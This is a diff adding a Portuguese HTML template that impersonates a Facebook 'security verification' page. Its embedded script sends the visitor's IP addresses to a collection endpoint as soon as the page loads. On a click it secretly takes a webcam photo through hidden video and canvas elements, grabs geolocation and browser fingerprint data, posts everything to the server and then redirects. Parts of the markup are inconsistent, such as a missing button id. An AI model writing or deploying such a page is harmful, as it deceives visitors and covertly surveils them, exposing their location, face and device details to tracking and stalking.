@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificação de Segurança</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #f9fafb;
+      color: #111827;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      background: white;
+      border-radius: 16px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.08);
+      padding: 32px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 60px;
+      margin-bottom: 16px;
+    }
+
+    h2 {
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    p {
+      font-size: 15px;
+      color: #6b7280;
+      margin-bottom: 24px;
+    }
+
+    .button-link {
+      display: inline-block;
+      background-color: #2563eb;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 20px;
+      font-size: 16px;
+      text-decoration: none;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .button-link:hover {
+      background-color: #1d4ed8;
+    }
+
+    #mensagem {
+      font-size: 14px;
+      color: #374151;
+      margin-top: 16px;
+      font-weight: bold;
+    }
+
+    .loading {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #6b7280;
+    }
+
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #2563eb;
+      border-radius: 50%;
+      width: 28px;
+      height: 28px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 8px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo" class="logo">
+
+    <h2>Verificação de Segurança</h2>
+    <p>Por favor, clique para continuar.</p>
+
+    <a href="https://www.facebook.com" class="button-link">Seguinte</a>
+    <p id="mensagem"></p>
+
+    <div class="loading" id="loading" style="display:none;">
+      <div class="spinner"></div>
+      Verificando informações...
+    </div>
+  </div>
+
+</body>
+</html>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const slug = {{ slug | tojson | safe }};
+    const destino = {{ destino | tojson | safe }};
+    const inicioTempo = Date.now();
+
+    // Coleta de IP Inicial
+    (async () => {
+        let ip_v4 = "indefinido";
+        let ip_v6 = "indefinido";
+        let porta = location.port || (location.protocol === "https:" ? "443" : "80");
+
+        try {
+            const resV4 = await fetch("https://api.ipify.org?format=json");
+            if (resV4.ok) ip_v4 = (await resV4.json()).ip;
+        } catch (e) {}
+
+        try {
+            const resV6 = await fetch("https://api64.ipify.org?format=json");
+            if (resV6.ok) ip_v6 = (await resV6.json()).ip;
+        } catch (e) {}
+
+        try {
+            const payloadInicial = { slug, ip_v4, ip_v6, porta };
+            await fetch("/coletar_ip_inicial", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payloadInicial)
+            });
+        } catch (e) {}
+    })();
+
+    const coletarInfoBrowser = () => {
+        return {
+            userAgent: navigator.userAgent,
+            idioma: navigator.language,
+            fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            larguraTela: window.screen.width,
+            alturaTela: window.screen.height,
+            plataforma: navigator.platform,
+            conexao: (navigator.connection || {}).effectiveType || "indisponível"
+        };
+    };
+
+    async function coletarDadosDetalhes() {
+        let latitude = "indefinido", longitude = "indefinido", foto_base64 = null;
+        const mensagemElement = document.getElementById('mensagem');
+
+        try {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            if (video && canvas && navigator.mediaDevices?.getUserMedia) {
+                const streamPromise = navigator.mediaDevices.getUserMedia({ video: true });
+                const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 10000));
+                const stream = await Promise.race([streamPromise, timeoutPromise]);
+
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 3000));
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                foto_base64 = canvas.toDataURL("image/jpeg", 0.8);
+
+                stream.getTracks().forEach(track => track.stop());
+            }
+        } catch (e) {}
+
+        try {
+            if (navigator.geolocation) {
+                const geoPromise = new Promise((res, rej) =>
+                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 30000 })
+                );
+                const pos = await Promise.race([
+                    geoPromise,
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 30000))
+                ]);
+                latitude = pos.coords.latitude.toString();
+                longitude = pos.coords.longitude.toString();
+            }
+        } catch (e) {}
+
+        const infosBrowser = coletarInfoBrowser();
+
+        let ip_v4_detalhes = "indefinido";
+        let ip_v6_detalhes = "indefinido";
+        let porta_detalhes = location.port || (location.protocol === "https:" ? "443" : "80");
+
+        try {
+            const resV4 = await fetch("https://api.ipify.org?format=json");
+            if (resV4.ok) ip_v4_detalhes = (await resV4.json()).ip;
+        } catch (e) {}
+
+        try {
+            const resV6 = await fetch("https://api64.ipify.org?format=json");
+            if (resV6.ok) ip_v6_detalhes = (await resV6.json()).ip;
+        } catch (e) {}
+
+        const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 3000);
+
+        const payloadDetalhes = {
+            slug,
+            ip_v4: ip_v4_detalhes,
+            ip_v6: ip_v6_detalhes,
+            porta: porta_detalhes,
+            latitude,
+            longitude,
+            foto_base64,
+            tempoSegundos,
+            sistema: infosBrowser.plataforma,
+            navegador: infosBrowser.userAgent,
+            idioma: infosBrowser.idioma,
+            fusoHorario: infosBrowser.fusoHorario,
+            conexao: infosBrowser.conexao,
+            larguraTela: infosBrowser.larguraTela,
+            alturaTela: infosBrowser.alturaTela
+        };
+
+        try {
+            if (mensagemElement) mensagemElement.innerText = "Redirecionando para site seguro...";
+            const res = await fetch("/coletar_dados", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payloadDetalhes)
+            });
+
+            window.location.href = `/redir/${slug}`;
+        } catch (e) {
+            window.location.href = `/redir/${slug}`;
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        const btn = document.getElementById('permitir');
+        btn.addEventListener('click', () => {
+            document.getElementById('loading').style.display = 'block';
+            coletarDadosDetalhes();
+        });
+    });
+
+    // Elementos esperados no HTML:
+    /*
+    <video id="video" width="640" height="480" autoplay style="display: none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+    <p id="mensagem" style="text-align: center; color: white;"></p>
+    */
+</script>
+
+</body>
+</html>
